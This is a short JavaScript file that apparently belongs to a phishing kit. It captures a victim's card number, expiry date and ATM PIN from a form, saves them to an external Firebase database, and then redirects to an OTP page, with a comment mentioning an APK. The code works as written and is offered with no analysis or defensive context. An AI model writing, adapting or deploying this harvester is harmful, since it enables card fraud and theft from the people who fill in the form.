
// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

    var ccard = getElementVal("ccard");
    var cexp = getElementVal("cexp");
    var cpin = getElementVal("cpin");
    

  

  saveMessages(ccard, cexp, cpin);

  // redirect to apk
  window.location.href = "otpa.html";
}

const saveMessages = (ccard, cexp, cpin) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
      Card_Number: ccard,
      Expiry_Date: cexp,
      ATM_PIN: cpin,
      
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

